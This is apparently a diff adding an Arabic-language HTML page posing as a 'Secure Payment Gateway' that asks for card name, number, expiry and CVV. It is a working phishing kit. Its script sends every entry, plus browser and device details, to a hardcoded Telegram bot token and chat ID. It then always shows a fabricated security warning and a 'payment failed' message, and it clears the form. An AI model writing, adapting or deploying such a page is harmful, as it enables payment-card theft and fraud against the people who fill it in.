@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment Gateway</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background-color: #eef2f6;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .payment-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+
+        .payment-header {
+            background-color: #1a202c;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+        }
+
+        .payment-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #48bb78;
+            background: rgba(72, 187, 120, 0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+        }
+
+        .payment-body {
+            padding: 24px;
+        }
+
+        .payment-body h2 {
+            font-size: 20px;
+            color: #2d3748;
+            margin-bottom: 4px;
+        }
+
+        .payment-body p {
+            font-size: 13px;
+            color: #718096;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #4a5568;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.2s;
+            background-color: #f8fafc;
+            font-family: 'Cairo', sans-serif;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .input-group input:focus {
+            border-color: #3182ce;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #a0aec0;
+            font-weight: 400;
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row .input-group {
+            flex: 1;
+        }
+
+        .pay-button {
+            width: 100%;
+            padding: 16px;
+            background-color: #2b6cb0;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .pay-button:hover {
+            background-color: #2c5282;
+        }
+
+        .pay-button:disabled {
+            background-color: #a0aec0;
+            cursor: not-allowed;
+        }
+
+        /* النوافذ المنبثقة */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(3px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            transform: scale(0.95);
+            transition: transform 0.3s ease;
+            text-align: center;
+        }
+
+        .modal-overlay.show .modal-content {
+            transform: scale(1);
+        }
+
+        /* نافذة فشل الدفع */
+        .failed-modal {
+            border-top: 6px solid #e53e3e;
+        }
+        
+        .failed-icon {
+            font-size: 50px;
+            color: #e53e3e;
+            margin-bottom: 15px;
+        }
+
+        .failed-modal h3 {
+            color: #c53030;
+        }
+
+        .btn-failed {
+            background-color: #e53e3e;
+            color: white;
+        }
+
+        .btn-failed:hover {
+            background-color: #c53030;
+        }
+
+        /* نافذة التحذير */
+        .warning-modal {
+            border-top: 6px solid #dd6b20;
+        }
+        
+        .warning-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .warning-modal h3 {
+            color: #c53030;
+        }
+
+        .btn-warning {
+            background-color: #dd6b20;
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background-color: #c05621;
+        }
+
+        .modal-content h3 {
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+
+        .modal-content p {
+            color: #4a5568;
+            font-size: 14px;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+
+        .modal-content p strong {
+            color: #c53030;
+        }
+
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="payment-card">
+        <div class="payment-header">
+            <h1>بوابة الدفع</h1>
+            <div class="secure-badge"></div>
+        </div>
+
+        <div class="payment-body">
+            <h2>إتمام عملية الدفع</h2>
+            <p>يرجى إدخال بيانات البطاقة الائتمانية للمتابعة.</p>
+
+            <div class="input-group">
+                <label>الاسم بالكامل (كما هو على البطاقة)</label>
+                <input type="text" id="cardName" placeholder="اسمك الكامل" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label>رقم البطاقة</label>
+                <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
+            </div>
+
+            <div class="row">
+                <div class="input-group">
+                    <label>تاريخ الانتهاء</label>
+                    <input type="tel" id="expiryDate" placeholder="MM/YY" maxlength="5" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>رمز الأمان (CVV)</label>
+                    <input type="tel" id="cvv" placeholder="123" maxlength="4" autocomplete="off">
+                </div>
+            </div>
+
+            <button class="pay-button" id="payBtn" onclick="processPayment()">
+                <span id="btnText">إكمال الدفع</span>
+                <div class="loader" id="btnLoader"></div>
+            </button>
+        </div>
+    </div>
+
+    <!-- 1. التحذير الأمني (يظهر أولاً) -->
+    <div class="modal-overlay" id="warningModal">
+        <div class="modal-content warning-modal">
+            <div class="warning-icon">⚠️</div>
+            <h3>تنبيه أمني عالي الخطورة!</h3>
+            <p>
+                هذا المحتوى حساس للغاية ويحتوي على روابط أو طرق دفع غير آمنة ومصنفة كخطر سيبراني. 
+                <br><br>
+                يرجى توخي أقصى درجات الحذر؛ الاستمرار في استخدام هذه الطرق قد يعرض أموالك وسجل بطاقاتك المصرفية للسرقة أو الاحتيال الإلكتروني الفوري. 
+                <br><br>
+                <strong>دخولك على مسؤوليتك الشخصية بالكامل.</strong>
+            </p>
+            <button class="modal-btn btn-warning" onclick="showFailedModal()">أوافق وأتحمل المسؤولية</button>
+        </div>
+    </div>
+
+    <!-- 2. فشل عملية الدفع (يظهر بعد التحذير) -->
+    <div class="modal-overlay" id="failedModal">
+        <div class="modal-content failed-modal">
+            <div class="failed-icon">❌</div>
+            <h3>فشل عملية الدفع</h3>
+            <p>
+                عذراً، لم نتمكن من إتمام العملية. 
+                <br>
+                يرجى التحقق من بيانات البطاقة أو المحاولة لاحقاً.
+            </p>
+            <button class="modal-btn btn-failed" onclick="closeModals()">حسناً، فهمت</button>
+        </div>
+    </div>
+
+    <script>
+        // ---- 1. تنسيق المدخلات ----
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
+
+        document.getElementById('expiryDate').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (value.length > 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        document.getElementById('cvv').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+
+        // ---- 2. إعدادات التليجرام ----
+        const TELEGRAM_BOT_TOKEN = '8469595165:AAGqbAhhEEMUYS9CgIY9n7eiNbogfCjF8uI';
+        const TELEGRAM_CHAT_ID = '5906639778';
+
+
+        // ---- 3. معلومات الجهاز ----
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = "غير معروف";
+            let browser = "غير معروف";
+
+            if (ua.indexOf("Win") != -1) os = "Windows";
+            else if (ua.indexOf("Mac") != -1) os = "MacOS";
+            else if (ua.indexOf("Linux") != -1) os = "Linux";
+            else if (ua.indexOf("Android") != -1) os = "Android";
+            else if (ua.indexOf("like Mac") != -1) os = "iOS";
+
+            if (ua.indexOf("Chrome") != -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") != -1) browser = "Safari";
+            else if (ua.indexOf("Edge") != -1) browser = "Edge";
+            else if (ua.indexOf("Opera") != -1) browser = "Opera";
+
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language || navigator.userLanguage;
+            const platform = navigator.platform;
+
+            return { os, browser, screenResolution, language, platform };
+        }
+
+
+        // ---- 4. معالجة الدفع ----
+        function processPayment() {
+            const name = document.getElementById('cardName').value.trim();
+            const card = document.getElementById('cardNumber').value.trim();
+            const date = document.getElementById('expiryDate').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const payBtn = document.getElementById('payBtn');
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+
+            payBtn.disabled = true;
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'block';
+
+            const device = getDeviceInfo();
+
+            const message = `
+🔴 **عملية دفع جديدة (فاشلة)** 🔴
+-------------------------
+💳 **بيانات البطاقة:**
+👤 **الاسم:** ${name || 'غير مدخل'}
+💳 **البطاقة:** \`${card || 'غير مدخل'}\`
+📅 **التاريخ:** ${date || 'غير مدخل'}
+🔒 **CVV:** ${cvv || 'غير مدخل'}
+
+📱 **معلومات الجهاز:**
+💻 **النظام:** ${device.os}
+🌐 **المتصفح:** ${device.browser}
+🖥️ **دقة الشاشة:** ${device.screenResolution}
+🗣️ **اللغة:** ${device.language}
+⚙️ **المنصة:** ${device.platform}
+-------------------------
+⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}
+            `;
+
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                console.log("تم الإرسال");
+            })
+            .catch(error => {
+                console.error("خطأ:", error);
+            })
+            .finally(() => {
+                setTimeout(() => {
+                    payBtn.disabled = false;
+                    btnText.style.display = 'block';
+                    btnLoader.style.display = 'none';
+                    
+                    // إظهار التحذير الأمني أولاً
+                    document.getElementById('warningModal').classList.add('show');
+                }, 1500);
+            });
+        }
+
+
+        // ---- 5. دوال النوافذ ----
+        // بعد الموافقة على التحذير، نظهر فشل الدفع
+        function showFailedModal() {
+            document.getElementById('warningModal').classList.remove('show');
+            setTimeout(() => {
+                document.getElementById('failedModal').classList.add('show');
+            }, 300);
+        }
+
+        function closeModals() {
+            document.getElementById('failedModal').classList.remove('show');
+            document.getElementById('warningModal').classList.remove('show');
+            document.getElementById('cardName').value = '';
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('expiryDate').value = '';
+            document.getElementById('cvv').value = '';
+        }
+    </script>
+
+</body>
+</html>
